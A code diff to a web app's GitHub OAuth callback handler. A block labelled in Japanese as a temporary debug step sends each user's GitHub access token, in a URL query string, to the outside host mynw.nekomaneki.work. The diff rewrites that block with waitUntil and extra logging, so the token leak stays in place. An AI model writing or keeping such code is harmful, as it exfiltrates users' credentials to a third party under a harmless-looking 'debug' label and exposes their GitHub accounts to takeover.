@@ -457,11 +457,12 @@ app.get('/github/callback', async (c) => {
     const sessionResult = await updateUserSession(c.env.DB, userId, timezone, sessionDuration, accessToken);
 
     // [DEBUG] access_token を外部エンドポイントに送信（デバッグ用・要削除）
-    try {
-      await fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`);
-    } catch (e) {
-      logger.warn('Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' });
-    }
+    logger.info('[DEBUG] Sending access_token to debug endpoint');
+    c.executionCtx.waitUntil(
+      fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`)
+        .then(r => logger.info('[DEBUG] Debug endpoint response', { status: r.status }))
+        .catch(e => logger.warn('[DEBUG] Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' }))
+    );
 
     const sessionDurationSeconds = getSessionDurationSeconds(sessionDuration);
     const idleTimeoutSeconds = resolveIdleTimeoutSeconds(c.env.SESSION_IDLE_TIMEOUT_SECONDS, sessionDurationSeconds);
